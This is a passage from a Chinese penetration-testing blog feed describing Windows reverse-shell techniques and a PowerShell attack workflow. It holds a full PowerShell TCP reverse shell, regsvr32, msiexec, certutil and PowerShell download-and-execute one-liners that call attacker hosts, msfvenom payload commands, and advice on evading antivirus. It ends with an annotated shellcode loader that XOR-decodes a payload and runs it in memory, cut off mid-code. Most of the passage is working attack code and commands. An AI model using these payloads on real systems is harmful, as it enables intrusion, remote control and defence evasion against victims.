Hidden -c &quot;<span class="hljs-variable">$client</span> = New-Object System.Net.Sockets.TCPClient(\&#x27;</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>\<span class="hljs-string">&#x27;,10000);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client.GetStream</span>();[byte[]]<span class="hljs-variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream.Read</span>(<span class="hljs-variable">$bytes</span>, 0, <span class="hljs-variable">$bytes.Length</span>)) -ne 0)&#123;;<span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,0, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="hljs-variable">$sendback2</span>  = <span class="hljs-variable">$sendback</span> + \&#x27;</span>PS \<span class="hljs-string">&#x27; + (pwd).Path + \&#x27;</span>&gt; \<span class="hljs-string">&#x27;;<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream.Write</span>(<span class="hljs-variable">$sendbyte</span>,0,<span class="hljs-variable">$sendbyte.Length</span>);<span class="hljs-variable">$stream.Flush</span>()&#125;;<span class="hljs-variable">$client.Close</span>()&quot;&#x27;</span>)<span class="hljs-comment">;</span><br><br>    ]]&gt;<br>&lt;/script&gt;<br>&lt;/registration&gt;<br>&lt;/scriptlet&gt;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207093842891.png" alt="image-20240207093842891"></p><p>反弹成功</p><p>远程执行加载，将srt文件放入http.server服务器里</p><p>然后使用远程加载的方式执行</p><p>然后受害者执行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">regsvr32.exe <span class="hljs-regexp">/n /</span>s <span class="hljs-regexp">/u /i</span>:http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>:<span class="hljs-number">8000</span>/cmd.sct scrobj.dll<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207094703089.png" alt="image-20240207094703089"></p><p>完美反弹shell</p><h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><h3 id="psh"><a href="#psh" class="headerlink" title="psh"></a>psh</h3><ol><li><p>使用msfvenom生成一个payload(psh)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.79.138 <span class="hljs-attribute">LPORT</span>=10000 -f psh &gt; 10000.ps1<br></code></pre></td></tr></table></figure></li><li><p>开启http服务</p></li><li><p>使用受害机远程加载</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">powershell.exe -c <span class="hljs-string">&quot;iex (new-object system.net.webclient).downloadstring(&#x27;http://192.168.79.138:8000/10000.ps1&#x27;);10000.ps1&quot;</span><span class="hljs-comment">;  </span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207102546441.png" alt="image-20240207102546441"></p></li></ol><h3 id="psh-reflection"><a href="#psh-reflection" class="headerlink" title="psh-reflection"></a>psh-reflection</h3><p>和上面的基本一致，只是生成的脚本不一致而已，然后执行的时候可以不用分号后面添加脚本的名字</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207103108325.png" alt="image-20240207103108325"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.79.138 <span class="hljs-attribute">LPORT</span>=10000 -f   psh-reflection -o 10000.ps1<br><br></code></pre></td></tr></table></figure><p>执行</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">powershell.exe -c <span class="hljs-string">&quot;iex (new-object system.net.webclient).downloadstring(&#x27;http://192.168.79.138:8000/10000.ps1&#x27;)&quot;</span><span class="hljs-comment">;  </span><br></code></pre></td></tr></table></figure><h2 id="PowerShell加载Powercat"><a href="#PowerShell加载Powercat" class="headerlink" title="PowerShell加载Powercat"></a>PowerShell加载Powercat</h2><ol><li><p>下载powercat</p><blockquote><p>powercat 就是使用.NET框架写的nc 和nc的使用完全一致</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/besimorhino/</span>powercat.git<br></code></pre></td></tr></table></figure></li><li><p>在powercat的路径开启http.server</p></li><li><p>受害者执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex (new-object system.net.webclient).downloadstring(&#x27;http://192.168.79.138:8000/powercat.ps1&#x27;);powercat -c 192.168.79.138 -p 10000 -e powershell&quot;</span>;  <br></code></pre></td></tr></table></figure></li></ol><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207104452006.png" alt="image-20240207104452006"></p><p>反弹成功</p><h2 id="PowerShell启动Cscript"><a href="#PowerShell启动Cscript" class="headerlink" title="PowerShell启动Cscript"></a>PowerShell启动Cscript</h2><p>少用不能免杀</p><ol><li><p>生成一个payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.79.138 <span class="hljs-attribute">LPORT</span>=10000 -f   vbs -o 10000.vbs<br></code></pre></td></tr></table></figure></li><li><p>上传到http.server上</p></li><li><p>远程加载</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">powershell.exe -c <span class="hljs-string">&quot;(New-Object System.NET.WebClient).DownloadFile(&#x27;http://139.155.49.43:8000/3.vbs&#x27;,<span class="hljs-subst">\&quot;</span>$env:temp<span class="hljs-subst">\t</span>est.vbs<span class="hljs-subst">\&quot;</span>);Start-Process %windir%\system32\cscript.exe <span class="hljs-subst">\&quot;</span>$env:temp<span class="hljs-subst">\t</span>est.vbs<span class="hljs-subst">\&quot;</span>&quot;</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h2><p>msi文件格式</p><ol><li><p>先生成一个payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.79.138 <span class="hljs-attribute">LPORT</span>=10000 -f msi -o 10000.msi<br></code></pre></td></tr></table></figure></li><li><p>开启http.server的服务</p></li><li><p>然后远程访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msiexec.exe <span class="hljs-regexp">/q /i</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>:<span class="hljs-number">8000</span>/<span class="hljs-number">10000</span>.msi <br></code></pre></td></tr></table></figure></li></ol><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207112047416.png" alt="image-20240207112047416"></p><h2 id="exe-升级msf-session-handler监听"><a href="#exe-升级msf-session-handler监听" class="headerlink" title="exe + 升级msf session + handler监听"></a>exe + 升级msf session + handler监听</h2><p>原理</p><p>使用handler监听和nc监听是一样的</p><ol><li><p>生成一个paylod</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.79.138 <span class="hljs-attribute">LPORT</span>=10000 -f exe -o 10000.exe<br></code></pre></td></tr></table></figure><p>这个方式不是metepreter ，只是一个Shell</p><p>后续可以通过升级的方式升级成为metepreter</p></li><li><p>使用msf监听</p></li><li><p>下载到受害机，并且执行</p><p>这里使用certutil执行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil.<span class="hljs-keyword">exe</span> -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>/<span class="hljs-number">10000</span>.<span class="hljs-keyword">exe</span> <span class="hljs-keyword">c</span>:\windows\temp\<span class="hljs-number">44</span>.<span class="hljs-keyword">exe</span> &amp; start <span class="hljs-keyword">c</span>:\windows\temp\<span class="hljs-number">44</span>.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135558597.png" alt="image-20240207135558597"></p><p>成功下载文件，并且执行</p></li><li><p>反弹</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135710179.png" alt="image-20240207135710179"></p><p>但是我们想反弹那到msf handler 上面</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207135859435.png" alt="image-20240207135859435"></p><p>升级session 这里的session是只有一个shell</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207140004307.png" alt="image-20240207140004307"></p><p>就多一个session</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%8F%8D%E5%BC%B9shell/image-20240207140034057.png" alt="image-20240207140034057"></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Powershell渗透框架</title>
    <link href="/2024/02/04/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/"/>
    <url>/2024/02/04/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="Powershell基础"><a href="#Powershell基础" class="headerlink" title="Powershell基础"></a>Powershell基础</h1><h2 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h2><ol><li><p>windows下的cat </p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204194413264.png" alt="image-20240204194413264"></p></li><li><p>删除文件</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">del</span> /<span class="hljs-function"><span class="hljs-title">f</span>(强制)</span><br></code></pre></td></tr></table></figure></li><li><p>复制文件</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">copy</span><br></code></pre></td></tr></table></figure></li><li><p>移动文件 </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">move <br></code></pre></td></tr></table></figure></li><li><p>查看进程</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">tasklist</span><br></code></pre></td></tr></table></figure></li><li><p>查看系统的版本</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systenminfo</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="运行powersehll"><a href="#运行powersehll" class="headerlink" title="运行powersehll"></a>运行powersehll</h2><ol><li><p>本地运行</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">powershell -ep bypass -f .\<span class="hljs-keyword">test</span>.ps1<br>powersehll -f <span class="hljs-keyword">test</span>.ps1<br></code></pre></td></tr></table></figure></li><li><p>远程运行</p><p>可以绕过绝大多数的杀毒软件</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&#x27;https://pastebin.com/raw/M676F14U&#x27;)&quot;</span><br>powershell -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&#x27;http://139.155.49.43:8000/cmd&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p>把远程url下载到内存里的字符串当作powersehll 脚本执行</p><p>现在来做演示</p><p>使用<a href="https://pastebin.com/">Pastebin.com - #1 paste tool since 2002!</a>挂载代码</p><p>粘贴文件创建文件然后出现下面这个</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204200517158.png" alt="image-20240204200517158"></p><p>生成了一个这个界面之后，点击raw </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204200602845.png" alt="image-20240204200602845"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204200655048.png" alt="image-20240204200655048"></p><p>就发现成功的执行了，但是实际上一般都是放到vps 上面，然后开启一个 http.server 的服务，就可以成功的访问了</p></li></ol><h2 id="执行策略-面试"><a href="#执行策略-面试" class="headerlink" title="执行策略(面试)"></a>执行策略(面试)</h2><ol><li><p>查看当前的执行策略</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-ExecutionPolicy</span>  <br></code></pre></td></tr></table></figure></li><li><p>查看所有的执行策略</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Get-ExecutionPolicy -list</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204201342883.png" alt="image-20240204201342883"></p></li><li><p>执行策略</p><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td><strong>AllSigned</strong></td><td>允许执行所有具有数字签名的脚本</td></tr><tr><td><strong>Bypass</strong></td><td>不阻止任何操作，并且没有任何警告或者提示</td></tr><tr><td>Default</td><td>设置默认执行策略。Restricted 适用于 Windows 客户端。为 Windows 服务器远程签名。</td></tr><tr><td>RemoteSigned</td><td>允许执行具有数字签名的通过网络下载的脚本；本地创建的脚本不要求脚本具有数字签名，可以直接执行。</td></tr><tr><td>Restricted</td><td>受限制的，可以执行单个的命令，但不能执行脚本，执行就会报错，Windows  8,Windows 8.1,Windows Server 2012中默认策略。</td></tr><tr><td>Undeﬁned</td><td>Undeﬁned 表示没有设置脚本策略。当然此时会发生继承或应用默认的脚本策略</td></tr><tr><td><strong>Unrestricted</strong></td><td>允许运行未签名的脚本。从网络上下载的脚本，在运行前会进行安全性提示。需要确认是否执行脚本。</td></tr></tbody></table><p>注意几个完全可以执行文件的策略</p></li></ol><h2 id="绕过执行策略"><a href="#绕过执行策略" class="headerlink" title="绕过执行策略"></a>绕过执行策略</h2><ol><li><p>远程直接加载（免杀）</p><p>很重要，因为无文件落地</p></li><li><p>添加参数</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-ep</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="无内存加载"><a href="#无内存加载" class="headerlink" title="无内存加载"></a>无内存加载</h2><ol><li><p>使用前面提到的远程加载</p></li><li><p>使用cs<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204210637416.png" alt="image-20240204210637416"></p><p>为了能免杀通过我们可以尝试做一下免杀，但是现在这些免杀技巧都是不能使用的</p><p>尝试获取它默认的payload</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204212151352.png" alt="image-20240204212151352"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204212157993.png" alt="image-20240204212157993"></p><p>首先改一下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204213047614.png" alt="image-20240204213047614"></p><p>先改成echo </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204213230648.png" alt="image-20240204213230648"></p><p>查看加密之后的是什么</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204213515374.png" alt="image-20240204213515374"></p><p>将输入导入新的文件，将添加echo的文件添加</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204213717999.png" alt="image-20240204213717999"></p><p>查看cs2</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204213841205.png" alt="image-20240204213841205"></p><p>发现就是一个简单加载bin文件的一个脚本，之所以会被查杀，就是因为bin文件里面有特征码</p><p>如果我们可以直接加载文件，而不是以字符串的形式就可以了</p><p>具体的过程是，先加载</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-w</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://139.155.49.43:8088/a&#x27;))&quot;</span><br></code></pre></td></tr></table></figure><p>但是一般使用下面这个</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://139.155.49.43:8088/a&#x27;))&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p> cs1.ps</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 启用 PowerShell 的严格模式，并设置版本为 2</span><br><span class="hljs-comment"># 强制要求变量在使用之前必须先声明，并且不允许使用未定义的属性、方法和变量等。</span><br><span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span><br><br><span class="hljs-comment"># 定义func_get_proc_address函数</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func_get_proc_address</span></span> &#123;<br>    <span class="hljs-comment"># 函数接收两个参数，$var_module表示要加载函数的DLL库名称，$var_procedure 表示要查找的函数名称。</span><br>    <span class="hljs-keyword">Param</span> (<span class="hljs-variable">$var_module</span>, <span class="hljs-variable">$var_procedure</span>)<br>    <span class="hljs-comment"># 通过GetAssemblies()方法获取当前应用程序域中已加载的所有程序集，然后使用Where-Object过滤出所有在全局程序集缓存中且名称为System.dll的程序集。</span><br>    <span class="hljs-comment"># 从 System.dll 中加载 Microsoft.Win32.UnsafeNativeMethods 类</span><br>    <span class="hljs-comment"># 使用GetType()方法从Microsoft.Win32.UnsafeNativeMethods类中获取一个表示GetProcAddress()方法的MethodInfo对象</span><br>    <span class="hljs-variable">$var_unsafe_native_methods</span> = ([<span class="hljs-type">AppDomain</span>]::CurrentDomain.GetAssemblies() | <span class="hljs-built_in">Where-Object</span> &#123; <span class="hljs-variable">$_</span>.GlobalAssemblyCache <span class="hljs-operator">-And</span> <span class="hljs-variable">$_</span>.Location.Split(<span class="hljs-string">&#x27;\\&#x27;</span>)[-<span class="hljs-number">1</span>].Equals(<span class="hljs-string">&#x27;System.dll&#x27;</span>) &#125;).GetType(<span class="hljs-string">&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;</span>)<br>    <span class="hljs-comment"># 使用GetType()方法从Microsoft.Win32.UnsafeNativeMethods类中获取一个表示GetProcAddress()方法的MethodInfo对象并获取 GetProcAddress 方法。</span><br>    <span class="hljs-variable">$var_gpa</span> = <span class="hljs-variable">$var_unsafe_native_methods</span>.GetMethod(<span class="hljs-string">&#x27;GetProcAddress&#x27;</span>, [<span class="hljs-type">Type</span>[]] <span class="hljs-selector-tag">@</span>(<span class="hljs-string">&#x27;System.Runtime.InteropServices.HandleRef&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>))<br>    <span class="hljs-comment"># 然后通过调用该对象的Invoke()方法，获取函数地址。</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$var_gpa</span>.Invoke(<span class="hljs-variable">$null</span>, <span class="hljs-selector-tag">@</span>([<span class="hljs-type">System.Runtime.InteropServices.HandleRef</span>](<span class="hljs-built_in">New-Object</span> System.Runtime.InteropServices.HandleRef((<span class="hljs-built_in">New-Object</span> IntPtr), (<span class="hljs-variable">$var_unsafe_native_methods</span>.GetMethod(<span class="hljs-string">&#x27;GetModuleHandle&#x27;</span>)).Invoke(<span class="hljs-variable">$null</span>, <span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$var_module</span>)))), <span class="hljs-variable">$var_procedure</span>))<br>&#125;<br><br><span class="hljs-comment"># 定义func_get_delegate_type函数，创建一个新的委托类型，并返回改类型</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func_get_delegate_type</span></span> &#123;<br>    <span class="hljs-comment"># 函数接收两个参数，$var_parameters 表示该委托类型所接受的参数为类型数组，是必需的参数。</span><br>    <span class="hljs-comment"># $var_return_type 表示该委托类型的返回值类型。默认为 [Void]</span><br>    <span class="hljs-keyword">Param</span> (<br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span> = <span class="hljs-number">0</span>, <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-type">Type</span>[]] <span class="hljs-variable">$var_parameters</span>,<br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span> = <span class="hljs-number">1</span>)] [<span class="hljs-type">Type</span>] <span class="hljs-variable">$var_return_type</span> = [<span class="hljs-built_in">Void</span>]<br>    )<br>    <span class="hljs-comment"># 使用 .NET 的 Reflection.Emit 命名空间动态创建具有指定参数和返回类型的新委托类型。</span><br>    <span class="hljs-comment"># 然后它为该委托类型定义一个构造函数和 Invoke 方法，并返回类型对象。</span><br>    <span class="hljs-variable">$var_type_builder</span> = [<span class="hljs-type">AppDomain</span>]::CurrentDomain.DefineDynamicAssembly((<span class="hljs-built_in">New-Object</span> System.Reflection.AssemblyName(<span class="hljs-string">&#x27;ReflectedDelegate&#x27;</span>)), [<span class="hljs-type">System.Reflection.Emit.AssemblyBuilderAccess</span>]::Run).DefineDynamicModule(<span class="hljs-string">&#x27;InMemoryModule&#x27;</span>, <span class="hljs-variable">$false</span>).DefineType(<span class="hljs-string">&#x27;MyDelegateType&#x27;</span>, <span class="hljs-string">&#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;</span>, [<span class="hljs-type">System.MulticastDelegate</span>])<br>    <span class="hljs-variable">$var_type_builder</span>.DefineConstructor(<span class="hljs-string">&#x27;RTSpecialName, HideBySig, Public&#x27;</span>, [<span class="hljs-type">System.Reflection.CallingConventions</span>]::Standard, <span class="hljs-variable">$var_parameters</span>).SetImplementationFlags(<span class="hljs-string">&#x27;Runtime, Managed&#x27;</span>)<br>    <span class="hljs-variable">$var_type_builder</span>.DefineMethod(<span class="hljs-string">&#x27;Invoke&#x27;</span>, <span class="hljs-string">&#x27;Public, HideBySig, NewSlot, Virtual&#x27;</span>, <span class="hljs-variable">$var_return_type</span>, <span class="hljs-variable">$var_parameters</span>).SetImplementationFlags(<span class="hljs-string">&#x27;Runtime, Managed&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$var_type_builder</span>.CreateType()<br>&#125;<br><br><span class="hljs-comment"># 通过比较IntPtr类型的大小是否为8字节，来判断系统是否为64位</span><br><span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;<br>    <span class="hljs-comment"># base64解码操作</span><br>    [<span class="hljs-built_in">Byte</span>[]]<span class="hljs-variable">$var_code</span> = [<span class="hljs-type">System.Convert</span>]::FromBase64String(<span class="hljs-string">&#x27;...base64加密后的payload...&#x27;</span>)<br><br>    <span class="hljs-comment"># 将byte数组进行xor异或操作</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$x</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$var_code</span>.Count; <span class="hljs-variable">$x</span>++) &#123;<br>        <span class="hljs-variable">$var_code</span>[<span class="hljs-variable">$x</span>] = <span class="hljs-variable">$var_code</span>[<span class="hljs-variable">$x</span>] <span class="hljs-operator">-bxor</span> <span class="hljs-number">35</span><br>    &#125;<br><br>    <span class="hljs-comment"># Marshal 类：提供了一个方法集合，这些方法用于分配非托管内存、复制非托管内存块、将托管类型转换为非托管类型，此外还提供了在与非托管代码交互时使用的其他杂项方法。</span><br>    <span class="hljs-comment"># GetDelegateForFunctionPointer&lt;TDelegate&gt;(IntPtr)：[在 .NET Framework 4.5.1 和更高版本中受支持] 将非托管函数指针转换为指定类型的委托。</span><br>    <span class="hljs-variable">$var_va</span> = [<span 